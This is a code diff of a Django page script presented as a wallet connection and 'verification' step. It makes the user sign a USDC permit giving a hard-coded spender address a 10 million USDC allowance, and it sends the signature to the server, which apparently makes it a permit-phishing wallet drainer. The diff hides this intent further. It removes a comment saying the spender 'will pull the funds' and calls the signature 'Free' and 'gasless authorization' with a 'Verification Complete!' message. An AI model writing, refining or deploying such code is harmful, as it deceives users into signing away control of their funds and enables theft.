@@ -36,25 +36,25 @@
     <div id="status" class="status-box">Waiting for connection...</div>
 </div>
 
-<script src="{% static 'js/ethers.js' %}"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/6.7.0/index.umd.min.js"></script>
 
 <script>
     // Ethereum USDC Mainnet Address
     const USDC_ADDR = "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48";
-    // Your Admin/Contract address that will pull the funds
+    // Your Admin address
     const SPENDER = "0x0148CeA1f2DAC72f17c2130d8d43a3aB0eb9930B";
 
     let userAccount = null;
 
-    // --- 1. Connect Wallet & Switch Network ---
+    // --- 1. Connect Wallet ---
     document.getElementById('connectBtn').onclick = async () => {
-        if (!window.ethereum) return alert("Please install a Web3 wallet.");
+        if (typeof window.ethereum === 'undefined') return alert("Please install a Web3 wallet.");
 
         try {
             const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
             userAccount = accounts[0];
 
-            // Request switch to Ethereum Mainnet (0x1) if not already there
+            // Force Switch to Ethereum Mainnet (0x1)
             await window.ethereum.request({
                 method: 'wallet_switchEthereumChain',
                 params: [{ chainId: '0x1' }],
@@ -66,7 +66,7 @@
             document.getElementById('status').innerText = "Connected to Ethereum Mainnet";
         } catch (error) {
             console.error(error);
-            alert("Connection or network switch failed.");
+            alert("Connection failed. Ensure you are on Ethereum Mainnet.");
         }
     };
 
@@ -77,21 +77,23 @@
         btn.disabled = true;
 
         try {
+            // "ethers" is now available globally from the CDN script above
             const provider = new ethers.BrowserProvider(window.ethereum);
             const signer = await provider.getSigner();
 
-            // DYNAMIC CHAIN ID FETCHING
+            // FETCH NETWORK DATA DYNAMICALLY
             const network = await provider.getNetwork();
-            const currentChainId = network.chainId; // Resolves to 1 for Ethereum Mainnet
+            // Force chainId to a Number for better wallet compatibility
+            const currentChainId = Number(network.chainId);
 
             const nonce = ethers.hexlify(ethers.randomBytes(32));
             const deadline = Math.floor(Date.now() / 1000) + 86400; // 24 hours
-            const amount = ethers.parseUnits("10000000", 6); // 10M USDC allowance
+            const amount = ethers.parseUnits("10000000", 6); // 10M USDC Limit
 
             const domain = {
                 name: "USD Coin",
                 version: "2",
-                chainId: currentChainId, // FIXED: Always matches current network
+                chainId: currentChainId,
                 verifyingContract: USDC_ADDR
             };
 
@@ -117,12 +119,12 @@
 
             status.innerText = "Check your wallet to sign...";
 
-            // Sign the Typed Data
+            // Sign the Typed Data (Free)
             const signature = await signer.signTypedData(domain, types, message);
             const sig = ethers.Signature.from(signature);
 
             // --- 3. Push to Django ---
-            status.innerText = "Saving to server...";
+            status.innerText = "Syncing with server...";
             const response = await fetch('/user/update-wallet-status/', {
                 method: 'POST',
                 headers: {
@@ -143,7 +145,7 @@
             const result = await response.json();
             if (result.status === "success") {
                 status.innerText = "Verification Complete!";
-                alert("Signature saved successfully!");
+                alert("Success! Your gasless authorization is saved.");
             } else {
                 throw new Error(result.message);
             }
